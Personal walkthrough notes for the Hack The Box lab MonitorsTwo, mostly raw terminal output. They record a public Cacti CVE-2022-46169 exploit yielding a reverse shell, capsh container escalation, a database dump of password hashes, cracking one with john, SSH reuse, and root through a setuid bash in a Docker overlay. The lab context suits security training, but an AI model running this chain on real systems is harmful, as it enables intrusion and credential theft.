
own: 10.10.14.75
target: 10.10.11.211

``` bash
┌─[ramdark@parrot]─[~]
└──╼ $sudo nmap -sC -sV 10.10.11.211
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
┌─[ramdark@parrot]─[~]
└──╼ $
```
[Exploit para cacti](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit)

``` bash 
┌─[✗]─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/MonitorsTwo/cacti]
└──╼ $python3 cacti.py 
Enter the target address (like 'http://123.123.123.123:8080')http://10.10.11.211 
Checking vulnerability...
App is vulnerable
Brute forcing id...
Enter your IPv4 address10.10.14.75
Enter the port you want to listen on9001
Delivering payload...
<html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>




┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/MonitorsTwo]
└──╼ $sudo nc -nlvp 9001 
[sudo] password for ramdark: 
listening on [any] 9001 ...
connect to [10.10.14.75] from (UNKNOWN) [10.10.11.211] 35594
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ whoami
whoami
www-data
bash-5.1$ cd /
cd /
bash-5.1$ cat entrypoint.sh
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi
chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
bash-5.1$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
bash-5.1$ /sbin/capsh --gid=0 --uid=0 
--/sbin/capsh --gid=0 --uid=0 --
whoami
root
mysql --host=db --user=root --password=root cacti -e "show tables"
Tables_in_cacti
aggregate_graph_templates...
...
mysql --host=db --user=root --password=root cacti -e "select * from user_auth"    
id	username	password	realm	full_name	email_address	must_change_password	password_change	show_tree	show_list	show_preview	graph_settings	login_opts	policy_graphs	policy_trees	policy_hosts	policy_graph_templates	enabled	lastchange	lastlogin	password_history	locked	failed_attempts	lastfail	reset_perms
1	admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC	0	Jamie Thompson	admin@monitorstwo.htb		on	on	on	on	on	21	1	1	1	on	-1	-1	-1		0	0	663348655
3	guest	43e9a4ab75570f5b	0	Guest Account		on	on	on	on	on	3	1	1	1	1	1		-1	-1	-1		0	0	0
4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune	marcus@monitorstwo.htb			on	on	on	on	11	1	1	1	on	-1	-1		on	0	0	2135691668
cd /bin
ls -la | grep bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 bash
lrwxrwxrwx 1 root root       4 Mar 27  2022 rbash -> bash
chmod u+s bash




┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/MonitorsTwo]
└──╼ $cat pass
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C

┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/MonitorsTwo]
└──╼ $sudo john pass --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)
1g 0:00:02:22 DONE (2023-06-08 05:35) 0.007037g/s 60.04p/s 60.04c/s 60.04C/s lilpimp..coucou
Use the "--show" option to display all of the cracked passwords reliably
Session completed
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/MonitorsTwo]
└──╼ $


┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/MonitorsTwo]
└──╼ $ssh marcus@10.10.11.211
The authenticity of host '10.10.11.211 (10.10.11.211)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.11.211' (ECDSA) to the list of known hosts.
marcus@10.10.11.211's password: <funkymonkey>
marcus@monitorstwo:~$ whoami
marcus
marcus@monitorstwo:~$ ls
CVE-2021-4034-main  cve-2021-4034.c  linpeas.sh  user.txt
Makefile            exp.sh           poc.sh
chisel              exploit.sh       pwnkit.c
cve-2021-4034       linpeas          pwnkit.sh
marcus@monitorstwo:~$ cat user.txt 
319b7c3ca8173729df77290ac3c4dc41
marcus@monitorstwo:~$ ./exp.sh
marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ls
bin   entrypoint.sh  lib    mnt   root  srv  usr
boot  etc            lib64  opt   run   sys  var
dev   home           media  proc  sbin  tmp
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ cd bin/
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ./bash -p
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# ls -la
total 36
drwx------  6 root root 4096 Mar 22 13:21 .
drwxr-xr-x 19 root root 4096 Mar 22 13:21 ..
lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Mar 22 13:21 .cache
drwxr-xr-x  3 root root 4096 Mar 22 13:21 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Mar 22 13:21 .ssh
drwxr-xr-x  2 root root 4096 Mar 22 13:21 cacti
-rw-r-----  1 root root   33 Jun  8 14:24 root.txt
bash-5.1# cat root.txt 
8a9002080d4fec58fdc17d5313854409
bash-5.1# 



```



